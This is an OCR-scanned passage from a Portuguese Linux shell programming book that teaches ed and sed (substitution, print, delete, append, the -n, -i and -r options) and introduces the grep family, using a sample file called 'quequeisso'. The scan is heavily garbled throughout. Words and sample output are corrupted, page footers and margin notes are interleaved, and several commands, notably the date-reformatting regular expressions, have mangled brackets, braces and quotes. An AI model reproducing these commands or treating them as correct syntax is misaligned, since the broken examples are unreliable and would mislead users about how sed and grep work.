O Shell 4lem de anblisar Cbdb dbdo entrbdo b partir do prornpt do UNIY., 
interfaceando co1n o.s u.suarios , tem tdll'bem as seguintes atribuicoes : 
Interpretador de comandos; 
Cont:role do ambiente UNIX; 
Redirecionament:o de ,;nr.rada c salda; 
Substituicao de nomes de arquivos ; 
Concat:enacao de pipe; 
execucao de programas; 
Podêrosn lingung~m dQ programacao . 
/"C 
Controle do ambiente UNIX; 
I 
Concar.enacao de pipe; 
Fim da linha: S 
Procura C no inicio da linha 
Procura próximo C no inicio da linha 
Da mesma forma que usamos o " para pesquisar no início da linha, usa-
mos um cifrão (que alguns preferem chamar dólar; eu prefiro usar cifrão e 
ter o dólar no bolso) para pesquisar no final da linha. 
1\latcna com d r bS utor<t 
106 Programação SheU Linux 
Assim: 
f luminense$ 
Procurará os caracteres fluminense somente se eles forem os últimos da 
linha. 
Antes do exemplo a seguir, vou passar o conceito de outro caractere, o 
ponto(.}, cuja finalidade é servir como uma espécie de curinga posicional, 
isto é, na posição em que o ponto (.) se encontra, qualquer caractere é 
válido. 
ca.et:a 
c.u 
Vejamos então o exemplo a seguir: 
$ od quequeisso 
H6 
/ UNIX .$ 
Ace~a caneta, capeta, careta, ... 
Aceita céu, cru, cpu, c lu ... 
O Shell a lem de anal isar cada dado ent.r;ado a partir do prompt do UNIX, 
1 
Repete a última pesquisa 
Co ntrole do ambiente UNIX; 
Substituição: s 1 1 
Para trocarmos uma cadeia de caracteres por outra, usamos um s seguido 
da cadeia inicial entre duas barras (/) e da cadeia final, fazendo: 
s/alhos/bugalhos 
O espaço entre os e a I é facu/faüvo 
~ 
Estaremos trocando alhos por bugalhos . MAS ATENÇAO! Somente a 
primeira linha em que ocorresse alhos seria alterada. Para alterarmos em 
todas as linhas deveríamos fazer: 
l,$ s/alhos/bugalhos 
Exemplo: 
l , $ s/de/xx 
Poxxrosa linguagem de programacao . 
l,$p 
.>.TEHCJI.O, O TEXTO ABAIXO ~fAO EH TRE!W..NENTO, 
EH UI1A LJWAGE!-1 CEREBRAL ! ! ! 
Troque de por xx em todas as linhas 
o Shell alem xx anali sar cada dado entrado a partir do pro~t do UNI>:, 
interfaceando com os usu<~rios, tem t<I!Tbern as seguinte;; atribuicoes : 
1\latcna com d r bS utor <t 
Comandos que não são do Planeta 
107 
Interpretador xx comandos; 
Controle do ambiente UNIX; 
Redirecionamento xx entrada e salda; 
Substituicao xx nomes de arquivos; 
Concatenacao xx p i pe; 
EY.ecucao Y.Y. pr ogramas; 
Po,:xrosa lingungcm de programacao . 
Aí, você que é esperto prá chuchu, vai me perguntar: 
Pôxa, a linha 8 ficou "Substituicao xx nomes de arquivos; " . Se o de 
permanece, é sinal que essa expressão regular não funciona! Não de-
veria ter um xx no lugar daquele maldito de? E eu vou lhe responder: 
Não, campeão, o s sozinho substitui somente a primeira ocorrência da 
primeira linha, se fizermos 1 , $ s será substituída a primeira ocorrên-
cia de todas as linhas. Note que o 1 , $ quer dizer da primeira à última 
linha, em nenhum lugar dissemos que a pesquisa deveria ser global. 
Então vamos desfazer essa alteração: 
u 
Ou (uncfo) desfaz a ultima alteração 
l,$p 
ATE~ICAC, C TEXTO ABAIXO NAO E:H TRE!NAI4ENTO, 
E:H UMA LAVi\GE!-1 CBREBRi\L! ! ! 
C Shell alem de analisar cada dado entrado a partir do prompt do UNIX, 
interfaceando com os usuarios, tem tarobem as seguintes atribuicoes: 
Interpretador de comandos; 
Controle do runbiente UNIX; 
Redirecionamento de entrada e salda; 
Substituicao de nomes de arquivos ; 
Concatenacao de pipe; 
execucao de programas; 
Poderosa linguagem de progrnllk1cao . 
Vamos finalmente globalizar essa substituição. Para tal, basta acrescen-
tarmos ao final da expressão regular a letra 9 de global. Vale acrescentar 
que a expressão regular 9 não está atrelada ao comando de substituição. 
Outros comandos também a usam para cumprir a mesma finalidade. Então 
devemos fazer: 
1\latcna com d r bS utor <t 
108 Programação SheU Linux 
1 ,$ s/de/xx/g 
1 , $ p 
ATEtJCAO, O TEXTO ABAIXO HAO EH TREINI't.NENTO, 
EH U!o!A. LAVAGEH CEREBRAL ! ! ! 
O Shell alem xx analisar cada dado entrado a partir elo prompc do UNIX, 
L~terfnceando com os usuari os, tem t~~em as seguintes atribuicoes ; 
Interpretador ;<x comandos; 
Controle do ambiente UNIX; 
Redirecionamento xx entrada e salda; 
sub.stituicao xx non1es xx a rqul vos ; 
Concatenacao xx pipe; 
Execucao xx programas; 
?oxxrosa linguagem xx programacao . 
Vamos agora restaurar o texto para podermos seguir em frente usando o 
que aprendemos sobre o ed . Para isso vamos desfazer a última alteração 
(undo). 
u 
O u desfaz a última alteração 
O comando sed 
Até no nome o comando sed se parece com o ed . Sua sintaxe geral é: 
sed expressão regular [arquivo] 
Onde expressão regular nada mais é senão uma das expressões re-
gulares como as que mostramos para o ed , mas que podem e devem 
ser vistas com maior abrangência no apêndice 2 deste livro (não deixe de 
entendê-las. pois são ferramentas poderosissimas de diversas linguagens 
e editores), mas que obedecem ao seguinte formato geral: 
[<endereço- 1>, [<endereço- 2>] ] <função> (argumento] 
Onde <endereço-!>, <endereço-2> definem o escopo de abrangência 
do comando. Se ambos forem omitidos, a interação será sobre todas as 
linhas do arquivo especificado. Se somente um for eleito, o comando só 
atuará sobre a linha referida. 
1\latcna com d r bS utor <t 
Comandos que não são do Planeta 
109 
Os endereços podem ser passados de duas formas: 
1. Referendando a linha pelo seu número: 
$ sad ' 4 ... • arquivo 
$ sad ' 4 ,9 .. . 1 arquivo 
2. Procurando por uma cadeia no texto, e esta pesquisa se faz colocan-
do a cadeia que se quer achar entre barras, como vimos no ed. 
$ sed '/c adeia/ ... ' arqui vo 
$ se<i • I cadeia ,! , I cadeia2 / ••• ' arqu.i v o 
Nos pares de exemplos mostrados, devemos observar que no primeiro 
de cada par o sed possui somente um endereço, isto é, no primeiro par atu-
aria somente sobre a linha 4 e no segundo nas linhas que a palavra cadeia 
fosse encontrada. 
Nos segundos exemplos de cada par, o comando sed atuaria sobre fai-
xas, no primeiro entre as linhas 4 e 9 e no segundo nas linhas entre a primei-
ra ocorrência de cadeia, e a primeira ocorrência de cadeia: , entre a segun-
da ocorrência de cadeia, e a segunda de cadeia,, e assim por diante. 
Se nenhum arquivo for especificado, é assumida a entrada padrão (o 
teclado, lembra-se?). 
As funções são várias e semelhantes ao editor ed (que também faz uso 
abundante de expressões regulares), como veremos a segUJr: 
Função substitui cadeia: ~ 
Como vimos no ect, o s substitui a cadeia de caracteres que está entre o 
primeiro par de barras6 pela cadeia contida no segundo par. 
Usando mais uma vez o nosso arquivo quequeisso, caso desejássemos 
destacar as palavras UNIX do texto, poderíamos fazer: 
$ sed 's/ UN!X/UNIX <- ACHEI!! I ' !/ ' quequeis so jSubstihiacadeiaUN/XporUN/X<-ACHE/!!1!!] 
AT&NCAO, O TEXTO ABAIXO NAO EH TREINN-IENTO, 
EH UNA LAVAGEM CEREBRAL!!! 
6. Par de barras ê uma simplíficação e seu uso ê. por motivos históricos, generalizado mas não obri-
gatório, podendo ser substitui do por ?expressão?, onde? ê qualquer caractere. 
1\latcna com d r bS utor <t 
110 Programação SheU Linux 
O Shell alem de analisar cada dado entrado a pa:rt1.:r do p:rompt do UNIX <-
ACHE I ! ! ! ! ! , 
interfaceando com os usuarios, tem tambem as seguintes atribuicoes : 
Interpretador de comandos; 
Co11trole do ambiente UNI X <- ACHEI!! ! !!; 
Redirecionamento de entrada e 
~aida; 
Suhsti tui cao de nomes de a rquivos; 
Concatenacao de pipe; 
Execucao de programas; 
Poderosa linguagem de programacao. 
No entanto, se fizéssemos: 
$ cat quequei sso 
ATE!ICAO, O TExTO ABAIXO NAO EH TREINAHENTO. 
EH Vl1A Lli.VAGEH CEREBRJ>.L! ! ! 
O Shell alem de analisar cada dado entrado a partir do prol!q)t: do UNix, 
intertaceando com os usuatios, cem t.atrioem as seguintes atrihuicoes: 
Interpretador de comandos ; 
co11trole do ambient:e UNIX; 
Redirecionamento de entrada e ~aida; 
substi tui cao de nomes de arquivos; 
Concatenacao de pipe; 
Execucao de programas; 
Poderosa linguagem de programacao . 
Ué! eu não acabei de trocar UNIX por UNIX <-
ACHEI! • ! ! ' ? Por que 
voltou tudo ao que era antes? 
Você trocou, mas não especificou a saída da alteração, então o texto 
alterado foi para a saída padrão (tela do terminal), não ficando fisicamente 
gravado em nenhum lugar. Para que as alterações sejam definitivas, a saí-
da do sed deve ser direcionada para um arquivo. 
ATEN ÀO 
Isto já foi avisado, mas sou chato e vou repetir! Não use como saída 
o arquivo de entrada, pois de:ssa forma você estaria perdendo todo o 
seu conteúdo, e sem chance de arrependimento. Conforme explicado 
antes, primeiramente o She/1 resolverá os redirecionamentos - criando 
a essa altura um arquivo de saída com tamanho O (zero)- e posterior-
mente executará o sed usando este arquivo vazio como entrada. 
1\latcna com d r bS utor <t 
Comandos que não são do Planeta 
111 
No exemplo adiante, da linha 1 a 2, vamos substituir as letras 
maiúsculas( lA- ZI lê-se de A até Z) por nada (no exemplo não foi colocado 
nada entre 1 t ) e finalmente vamos gJiobalizar essa pesquisa por todas as 
ocorrências nas duas linhas. A saída será redirecionada para um arquivo 
temporário para, caso queira, salvar as alterações executadas. 
$ sed ' 1 , 2s / [A- Z] / / g ' quequeisso > /tmp/ ex 
$ cat / t mp/ cx 
$ cat /tmp/ cx 
' 
I O I 
Da linha f a 2 troque rnaiusculo por nada 
Listaltmplex que é o arquívo de salda do sed 
Os t•tfnha sobraram uma, espaços e outra, 
Os 2' /inha sobraram 3 espaços e 3 I 
O Shell alem de analisar cada dado entrado a partir do prompt do UNIY., 
intetfaceando com os usuarios , tem tambem as seguintes atribuicoes: 
Interpretador de comandos; 
controle do ambiente UNIX; 
Redirecionamento de entrado e saida; 
Substitui cao de nomes de arquivos ; 
Concatenacao de pipe ; 
E-.ecucao de programas; 
Poderosa linguagem de programt~cao . 
O arquivo não será alterado para manter o exemplo didático e para lhe 
fazer, conforme prometido, uma lavagem cerebral. Mas, se você quisesse 
salvar as alterações, bastava: 
$ mv / tmp/ex quequeisso 
Lá no ed eu não falei sobre isso porque estava guardando esta carta na 
manga. Lá eu disse que se fizéssemos: 
s/a./ b/ 
estaríamos trocando o primeiro a encontrado por b e dissemos também 
que se fizéssemos: 
s/a/ b/g 
estaríamos trocando todos os a por b , mas as coisas não funcionam bem 
assim. Veja isso: 
Exemplo: 
$ s ed ' s/r/ X/2 ' quequeisso 
ATEJ.Jc .n.o, O TEXTO AB.lt!;<o Nt\0 EH TRE!NJ>.J·IENTO, 
EH UHA LAVAGEH CEREBRAL ! !! 
1\latcna com d r bS utor <t 
112 Programação SheU Linux 
o Shell alem de analisar cada dado entXado a partir do pro~t do UNIX, 
interf aceando com os usuaXios, r.em tambem as seguinte!! ar.ribuicoes : 
InterpXetador de comandos; 
Conr.role do a1nbi ente UNIX; 
Redirecionamenr.o de entXada e saida; 
Substituicao de nomes de arquivos ; 
concatenacao de pipe; 
~xecucao de progXamas; 
Poderosa 1 inguagem de pXogramacao . 
. 
Nesse caso, foi especificado que a segunda ocorrência da letra 
substituída por um x . 
r sena 
Da mesma maneira, para substituirmos todas as ocorrências de um tex-
to, a partir da segunda, deveremos fazer: 
$ sed ' s/'l'exto/Outro'l'exto/2g ' arquivo 
Exemplo: Para trocar todo r por x, faça: 
$ sed 's/r /X/2g' quequeisso 
i\T5NCAO, O TEXTO 1\BI~.!XO Hi\0 EH TREINJ\.1-!ENTO, 
EH Ul11\ LAV/\GE!-1 CEREBRAL ! ! ! 
O Shel l alem de analisar cada dado entXado a paXtiX elo pXompt do UNIX, 
intertaceando com os usuaXios, tem tambem as segu~ntes atXibuicoes : 
InterpXetadoX de comandos ; 
Controle do ambiente UNIX; 
Redirecionamento de entXada e salda; 
Substitui cao de nomes de arquivos; 
Concatenacao de pipe ; 
Execucao de progXamas; 
Poderosa linguagem de pXogXamacao . 
Voltemos aos exemplos de uso do 
$ cat quequeisso I sed 's/ . •//' 
Al'ENC.>.O, 
EH 
o 
int er f aceando 
Int erprer.ador 
controle 
Redirecionamento 
Sub.stituicao 
Cor'lca tenAc ao 
Ex:ecucao 
Poderosa 
sed : 
ObsetVe que existe 1 espaço entre a t 'I e o . 
1\latcna com d r bS utor<t 
Comandos que não são do Planeta 
113 
O comando cat gerou uma listagem do arquivo quequeisso que foi 
entregue ao comando sed pelo pipe 1 t l . Esse comando sed pede para 
substituir tudo após o primeiro espaço v . .., 1 1 por nada 1 11 1 , ou seja, 
todos os caracteres após o primeiro espaço são deletados. 
ATI:N Ao 
Essa forma de usar o comando sed, ou qualquer outro que não 
seja necessário o uso de pipes, deve ser evitada, pois cada novo 
pipe gera mais uma instância de She/1. Esse comando seria me-
lhor empregado de uma das formas a seguir: 
$ sed ' s/ .*//' quequeisso 
$ sod •s/ . *//' < quequoisso 
Função substitui caractere: y 
Assim como a função s substitui uma cadeia, a função y substitui um 
caractere, dessa forma, o que estiver entre os separadores da função 
y, que normalmente são barras (mas como já vimos, não obrigatoria-
mente), não será visto pelo sed como uma cadeia, mas sim como um 
agrupamento de caracteres. No exemplo a seguir, trocarei as t(ês pri-
meiras consoantes (bcd) maiúsculas ou minúsculas de quequeisso por 
algarismos de 1 a 3, respeitando a sequência natural destas letras den-
tre as consoantes. 
$ sed ' y/BCDbcd/123123/' quequeisso 
i\TBN2JI.O, O TEXTO J\lAIXO MJ\0 EH TREIN!'.MENTO, 
EH UNA LAVAGE!1 2 ERE1RAL ! !! 
O shell alem 3e analisar 2a3a 3a3o entra3o a partir 3o prompt 3o UNIX, 
interfa2ean3o 2om os usuarios, tem t:amlem as seguintes atrilui2oe.s : 
Interpreta3or 3e 2oman3os; 
2oncrole 3o amliente UNIX; 
Re3ire2ionamento 3e entra3a e sai3a; 
Sulsti tui 2ao 3Q nomQs 3Q arqui vos ; 
2on2acena2ao 3e pipe; 
Exe2u2ao 3e progr amas; 
Po3erosa linguagem 3e programa2ao . 
Caso tivéssemos usado a função s, só haveria troca se existisse em 
quequeisso uma Cadeia BCDbcd . 
1\latcna com d r bS utor<t 
114 Programação SheU Linux 
Função imprime (print): ~ 
Essa função serve para reproduzir linhas de um endereço especificado ou 
que atendam a determinado argumento de pesquisa. 
Exemplo: 
$ sed • / UNIX/p • quequei s so 
O p imprime a linha que atenda á expressilo 
ATE~ICAO, O TEXTO ABAIXO NAO E:H TREINANENTO, 
E:H UI1A LAVAGEN C&RE:BRAL ! ! ! 
O Shell alem de analisar cada dado entrado a partir do prompt do UNIX, 
O Shell alem de analisar <:<~da dado entrado a partir do prompt do UNIX, 
interfaceando com o:~ usuaxios, tem tarobem as seguintes atribuicoe:~ : 
Int erpretador de comandos; 
Controle do ambiente UNIX; 
Controle do ambiente UNIX; 
Redirecionamento de entrada e salda; 
Subs t i tui cao de nomes de arquivos; 
Concatenacao de pipe; 
Execucao de programas; 
Poderosa linguagem de programacao . 
Além disso, o comando sed também possui diversas opções que apre-
sentaremos a seguir. 
Repare que as linhas que continham a cadeia UNIX (argumento de pes-
quisa) foram duplicadas. Vamos fazerr um pouco diferente: 
$ sed • /UNIX/ ! p • quequei sso 
Repare o ! negando o p 
ATENCAO, O TEXTO AB!'.IXO NAO EH TREINAHENTO, 
ATE~ICAO, O TEXTO ABAIXO NAO EH TREINANEN'l'O, 
EH Ul1A LAVAG&!-1 CEREBRAL! ! ! 
EH UNA LAVAG&!1 CEREBRAL ! !! 
O Shell alem de anali:~ar cada dado entrado a partir do prompt do UNiX, 
i nterfaceando com os usuarios, tem tilll'bern as seguintes atríbuicoe:~ : 
1nterfaceando com os usuarios, tem cambern as seguintes atr1buicoes : 
In t erpre~:ador de comandos; 
Interpretador de comandos; 
Controle do ambiente UNIX; 
Redirecionamento de entrada e saida; 
Redirecionamento de entrada e saida; 
substi cui cao de nomes de arqui vos ; 
Subsci cui cao de nomes de arqui vos ; 
Concacenacao do pipe ; 
Concaccnacao de pipe ; 
Execucao de programas; 
1\latcna com d r bS utor<t 
Execucao de programas ; 
Poderosa l inguagem de programacao . 
?oderosa l inguagem de programacao . 
Comandos que não são do Planeta 
115 
Nesse caso, o ponto de espantação (ou exclamação, como preferir) ser-
ve para negar o p, isto é, serão impressas as linhas que não atenderem 
ao argumento de pesquisa (possuir a cadeia UNIX). Repare, portanto, que 
as linhas que possuem a cadeia UNIX não são repetidas, ao passo que as 
outras o são. 
Função deleta linha: d 
Deleta as linhas referenciadas ou que atendem ao argumento de pesquisa. 
Exemplos: 
S sed ' l ,4d' quequeis so 
Interprecador de comandos ; 
Concrole do ambience UNIX; 
Redirecionamen&o de entrada e saida; 
Substi tui cao de nome~ de arquivos; 
Concatenacao de pipe ; 
Execucao de programas; 
Poderosa l inguagem de programacao . 
$ sed '/UNIX/d' quequeisso 
ATENCAO, O TI>XTO ABAIXO NAO EH TREINAJoiENTO, 
E!i ü!•ll\. LAVAGEM CEREBRAL ! ! ! 
Detete da linha 1 até a 4 
Detete linhas que contenham UNIX 
intcrface~~do com os usuari os, t em t ambem as seguintes atribuicoes : 
!nterprecador de comandos; 
Redirecionament:o de onerada o salda; 
Subst:i t:ui cao de nomes de arquivos ; 
concacenacao de pipe; 
Execucao de programas; 
Poderosa linguagem de programacao . 
Observe que nos exemplos anteriores foram deletadas as linhas seguin-
tes: no primeiro caso as que foram apontadas pelos seus endereços e, no 
segundo, as que satisfizessem uma condição (possuírem a cadeia UNIX). 
Função ~crescenta: a 
Acrescenta após o endereço informado, uma nova linha cujo conteúdo vem 
a segu1r. 
1\latcna com d r bS utor<t 
116 Programação SheU Linux 
A sintaxe do comando usando a função fica assim: 
S sed '<endereço>a\ 
A I é obrigatória e serve para anular o new-líne 
> <texto a ser i nserido> ' arquivo 
A primeira linha do comando deve ser interrompida após o a, para tal usa-
se a barra invertida. O primeiro > das linhas seguintes é o prompt secundário 
(PS2l do UNIX. 
Exemplo: 
$ sed ' 2a\ 
> 3 - Como esperávamos a linha 3 fica após a segunda l inha ' quequeisso 
ATE:IICAO, O TEXTO ABAIXO NAO EH TREINANENTO, 
EH UNA LAVAGJ>M C EREBRAL ! ! ! 
3 -
Como esperávamos a linha 3 fica após a sequnda linha . 
o Shell alem de analisar cada dado entrado a parcir do prompc do UNlX, 
interfaceando com os usuarios , tem tal1'bem as seguintes at.ribuicoes : 
Interpretador de comandos ; 
Conttole do ambiente UNIX; 
Redir ecionamenco de entrada e saida; 
Substi t uic a o de nomes de a rqui vos ; 
Conc atenacao de pipe; 
Ex ecucao de pr og ra~3; 
Poderosa l inquagem de programacao . 
Função Insere: i 
Idêntica à função acrescenta, porém não insere após o endereço especifi-
cado, mas sim antes desse endereço. 
Função troca: c ~hange) 
Idêntica à função ª crescenta, porém não insere após o endereço espe-
cificado, mas sim troca o conteúdo desse endereço pelo informado no 
comando. 
Função finaliza: q (guit) 
Serve para marcar o ponto de término de execução do sed, o que em al-
guns casos é necessário. 
1\latcna com d r bS utor<t 
Comandos que não são do Planeta 
117 
Exemplo: 
Para listarmos o nosso velho e bom quequeisso até a primeira ocorrên-
cia da cadeia UNIX, poderíamos fazer: 
$ cat queque i s s o 1 s e d ' / UNIX/ q ' 
q encerra ocomandoquandoencontrarUNIX 
.>,TBNCAO, O TEXTO ABAIXO NAO EH TREINA.HENTO, 
EH Ul'IA LI\VAGE11 CEREBRAL ! ! ! 
O Shel l alem de analisar cada dado entrado a partir elo prornpt do UNIX, 
ou então: 
$ sed '/UNIX/q' quequeisso 
q encerra o comando quando encontrar UNIX 
ATENCAO, O TEXTO AB.l'.lXO NAO EH TREINP..NENTO, 
EH UMA LAVAGEN CEREBRAL ! !! 
o Shell alem de analisar cada dado entrado a panir do prornpt do UNIX, 
A opção -n 
Muito foi falado que o secl sempre transcrevia todas as linhas da entra-
da para a saída, este é o seu defauft. Para que possamos listar somente 
as linhas que atendem ao(s) critério(s) de pesquisa ou ao(s) endereço(s) 
especificado(s), devemos usar a opção -n, que fala ao sed : 
Não (not) mande nada para a saída, a não ser que algo explicitamen-
te o mande fazê-lo. 
E, é claro, o sed obedece. E como você já vai perceber, a opção - n vem 
sempre acompanhada da função p que é quem explícita a necessidade de 
mandar os dados para a saída. 
Exemplo: 
Vamos então separar as linhas de quequeisso que contenham pelo menos um 
"de " (um de compreendido entre dois espaços), das que não contenham. 
Linhas que contêm a cadeia: 
$ sed - n ' I d e / p ' 
quequeisso 
ObseNeque entre as/e o de existe um espaço 
O Shell al~ de analisar cada dado entrado a partir do prompt do UNJY., 
In têrpr~tado r de comandos ; 
Redirecionamento de entrada e saida; 
Subst i tuic~o de nome3 de arqu~vos ; 
Concatenacao de pipe ; 
Execucao de programa5; 
Poderos~ linguagem de programacao. 
1\latcna com d r bS utor <t 
118 Programação SheU Linux 
Linhas que não contêm a cadeia: 
S sed -n ' /de /!p' 
quequeisso 
Obse1ve o I negando o p 
."-TEHCAO, O TEXTO ABAIXO NAO EH TREINAHENTO, 
EH UHA LAVAGEM CEREBRAL! ! ! 
interfaceando com os usuarios, tem &~~em as seguintes atribuicoes : 
Controle do atnbi ent:e UNIX; 
A opção -i 
Se você deseja editar via sed e definitivamente alterar um arquivo, você 
deve fazer algo assim: 
$ sed ' s/Texto/TextoAlterado/' arquivo > arquivo.alterado 
$ mv arquivo.alterado arquivo 
Porém, no GNU sed (sempre o GNU facilitando nossa vida) você poderia 
fazer isso de forma muito simplificada usando a opção - i. Suponha que 
queira trocar todos os artigos "os" do nosso amigo quequeisso pelo seu 
similar em inglês "the". Então, cheio de convicção, faço: 
$ sed -i 's/os/the/g' quequeisso 
e para verificar: 
$ cat quequei3SO 
ATEIICAO, O TEXTO ABAIXO IIAO EH TREINI'.NENTO, 
EH UHA LAVAGI!H CEREBRAL!!! 
o Shel l alem de analisar cada dado entrado a partir do prompt do UNIX, 
inte rfaceando com the usuarit:he . tem ~a~lem as seguintes at:ribuicoes : 
Interpretador de comandthe ; 
Controle do ambient:e UNIX; 
Redirecionameneo de entrada e 
sa~da ; 
Substi tui cao de nomes de arquivthe; 
Concatcnacao d~ pip~; 
Exccucao de programas; 
?oderthe4 lingu4gem de progr4m4cco . 
Xiii, lambuzei o quequeisso porque eu deveria ter especificado que as cadeias 
"os" estariam entre espaços. Então vamos devolvê-lo à sua forma anterior: 
$ sod -i 's/tho/os/g ' quoquoisso 
$ cat quequeisso 
ATENCAO, O TEXTO ABAIXO NAO EH TREINAHEm'O, 
1\latcna com d r bS utor<t 
Comandos que não são do Planeta 
119 
EH VI1A LAVAGBii CEREBRAL ! ! ! 
O Shel l alem de analisar cada dado entrado a partir do prompt do U~JIX, 
interfaceando com os usuarios , cem eambem as seguintes atribuicoes: 
Interpretador de comandos; 
controle do ambiente UNIX; 
Redirecionamento de entrada e saida; 
Substituicao de nomes de arquivos ; 
concatenacao de pipe; 
Execucao de programas; 
Poderosa linguagem de programacao. 
Ainda bem que funcionou. Se anteriormente o texto tivesse uma ou mais 
cadeia(s) "the", essa volta não seria tão fácil. E é por isso que a opção -i 
tem um facilitador incrível que permite especificar o nome de um arquivo 
que manterá o conteúdo anterior intacto, para o caso de necessitar uma 
recuperação. Já que um bom exemplo vale mais que mil palavras, veja o 
caso abaixo: 
$ sed -i.velho 's/ os I the /g ' quequeisso 
$ ls queque* 
quequeisso 
quequeisso.velho 
Epa, agora são dois arquivos. Vamos ver seus conteúdos: 
$ ca.t quequeisso 
ATENCAO, O TSXTO ABAIXO NAO EH TREINANEN"TO, 
E.H UI1A LAVAGB!i CEREBRAL ! ! ! 
o Shel l alem de analisar cada dado entrado a parti.c elo prompt do UNIX, 
interfaceando co1n the usuarios , tem tambem as seguintes atribuicoes : 
Interpretador de comandos; 
conerole do ambiente UNIX; 
Redirecionameneo de entrada e salda; 
Substitui cao de nomes de arquivos ; 
concatenacao de pipe ; 
Execucao de programas; 
Poderosa linguagem ele programacao. 
$ cat quequeisso.velho 
ATEJICJI.O, O TEXTO Alll'.IXO NAO EH TREINI\.NENTO, 
EH VI1J'. L!WAG81i CSREBRi\!, ! ! ! 
O Shell alem de analisar cada dado e11erado a partir do prompt do UNIX, 
interfaceando cotn os usuarios, tem tambem as $eguintes atribuicoes: 
Interpretador de comandos; 
1\latcna com d r bS utor <t 
120 Programação SheU Linux 
con~;role do ambience UNIX; 
Redirecionamento de entrada e saida; 
Subs c i tuicao de nomes de arqu l vos ; 
Concatenacao de pipe ; 
Execucao de programas; 
Poderosa linguagem d e programacao . 
Como vocês viram, o quequeisso foi alterado, porém a opção - i usada 
juntamente com a extensão . velho salva uma cópia integra em quequeisso. 
velho . Repito: caso a opção -i tivesse sido usada sem a extensão, os 
dados teriam sido gravados no próprio quequeisso. 
A opção -r 
Se eu tenho uma data no formato dialmês/ano, ou seja, dd/mml aaaa e de-
sejo passá-la para o formato aaaa/mm/dd, eu deveria fazer: 
$ sed ' s/~\ ((0-9)\(2\)\)\/\ ( ( 0-9]\{2\)\ ) \/\ ((0-9)\{4\) \)$/\3\/\2\/\1/' <<< 31/12/2009 
2009/12/31 
Funcionou, mas a legibilidade diss·o está um horror! Aí tem mais contra-
barra < \ > que qualquer outra coisa! 
Justamente para facilitar a montagem das Expressões Regulares e 
sua legibilidade é que o GNU-sed tem a opção - r. Ela avisa ao sed que 
serão usados metacaracteres avançados, que dessa forma se encarrega 
das suas interpretações, não deixando-os para a interpretação do Shell. 
Esse mesmo sed poderia (e deveria) ser escrito da seguinte forma: 
$ sed -r 's/~ ([0-9)( 2))\/( [0-9) {2))\/ (( 0-9) {4) )$/\3\/\2\/\ 1/ ' <<< 31/12/2009 
2009/12/31 
Melhorou, mas ainda não está bom, porque ainda existem contrabarras 
{\) · escapando" às barras <I> da data para que o sed não as confun-
da com as barras u 1 separadoras de campo. Para evitar essa confusão, 
basta usar outro caractere, digamos o hífen <-1 , como separador. Veja-
mos como ficaria: 
Obs.: Devido à largura, algumas linhas foram "quebradas", indicação com (.J). 
1\latcna com d r bS utor <t 
Comandos que não são do Planeta 
121 
$ sed - r 
' s- ~ ([0 -9 ) [ 2} ) / ([ 0-9){ 2} } / ( [0 -9 ]{4 } )$- \3/\2/\1 - ' <<< 31/12/2009 
2009/12/31 
Agora ficou mais fácil de ler e podemos decompor a Expressão Regular 
para destrinchá-la. Vamos lá: 
1a Parte 
- " CI0-9Jt2J J / CI0-9J 12l l / CI0-9 Jt 4JJs . Vamos dividi-la: 
" I I o- 9]{2 l l 
-A partir do início 
c ~ > procuramos dois < 1 2 1 1 algarismos 
1 1 o- 91 1 . Isso casa com o dia; 
l <co-9li2JI / 
- Idêntica à anterior, porém por estar entre barras UL 
• 
• 
casara com o mes; 
< [0- 9){ 4 » s 
- procuramos quatro 
< 14 1 1 algarismos 
< ( o-91 1 no fim 
< s >. Isso casa com o ano; 
- \3/\2/\l 
Repare que as pesquisas de dia, mês e ano foram coloca-
das entre parênteses. Como os textos casados pelas Ex-
pressões Regulares no interior dos parênteses são guarda-
dos para uso futuro, os retrovisoreS\3, \2 e \1 foram usados 
para recuperar o ano, o mês e o dia, respectivamente. 
A família de comandos grep 
O comando grep é bastante conhecido, mas o que normalmente não sa-
bemos é que existem mais dois irmãos na sua família, além de diversas 
opções. 
A finalidade básica dos comandos é localizar cadeias de caracteres em 
uma entrada definida, que pode(m) ser arquivo(s), a saída de um comando 
passada através de um pipe 1 1 1 , ou a entrada padrão se nenhuma outra 
for especificada. Na verdade, essa localização dá-se por meio de expres-
sões regulares sofisticadas que obedecem ao padrão ed, daí o nome do 
comando (Global Regular Expression Print) . 
Exemplo: 
$ grep UNIX quoquoisso 
Entrada do grep é um arquivo 
O Shell alem ele analisar cada dado entrado a partir do prOl!Ç)t do UNIX, 
Controle do ~nbiente UNIX; 
1\latcna com d r bS utor<t 
122 Programação SheU Linux 
Nesse exemplo, o grep foi usado para listar as ocorrências da cadeia 
UNIX no famigerado quequeisso. 
$ grcp grep *. sh 
Entrada do grep siio os srqs tenninados em .sh 
lecl.sh: 
if 
( ' echc $ FrameOL I <J""'P -c " $DL" ' -ne O ] 
pe<Jasub . sh : 
grep " D. SUB . GER.'. Z" " /tmp/Dir$$ " > "/tmp/dir$$ " 
sub.s h : 
i f ( ' grep -c "530 Login attêll'pt failed" • /tmp/S$" · -ne O ] 
transsub . sh : Linha= · grep 'A ' SOIJ•I /usr/local/var/ArqOLs • 
transsub . sh : gcep ' ON PKBENEF . S ' DIR. SOL > DIR 
Nesse exemplo, o grep lista todas as linhas, de todos os arquivos ter-
minados em . sh . no diretório corrente (observe que arquivo = * . sh), que 
contenham a cadeia grep . Note que as linhas são precedidas pelo nome 
do arquivo onde se encontravam. 
$ p& axu I grep julio' 
Entrada do grep e um comando 
julio 
4428 
0 . 0 
2 . 8 
'1300 
876 
pO s 
17 : 07 
0 :02 -hash 
julio 
4645 
0 . 0 
1. 5 
856 
488 
pO R 
14 : •12 
0 :00 ps axu 
julio 
4646 
0 . 0 
2 . 8 
1300 
876 
pO R 
14 ; 42 
0 :00 grep julio 
Neste exemplo, o grep foi usado como saída do comando ps (erogram 
2Íatus) para localizar os processos em execução pelo usuário julio . Note 
que a 23 linha é referente ao ps e a última ao grep . 
Até aí tudo bem, você já sabia tudo isso. Vamos agora incrementares-
ses comandos, que são fundamentais na elaboração de scripts usando a 
linguagem She/1. Antes, porém, vam•os conhecer sua família, que possui 
três membros: 
Comando grep - Que pesquisa cadeias de caractere a partir de uma 
entrada definida, podendo ou não usar expressões regulares. 
Comando egrep (Extended grep) -Idêntico ao grep, porém mais po-
deroso e mais lento. Esse comando só deve ser utilizado em casos em 
que seja imprescindível o uso de expressões regulares complexas. 
Comando fgrep (Fast grep) -
O rapidinho da família, seu uso é indi-
cado para critérios de pesquisa que não envolvem expressões regula-
7. Esse formato do comando ps é característico do LINUX. Para obter resultado semelhante em um 
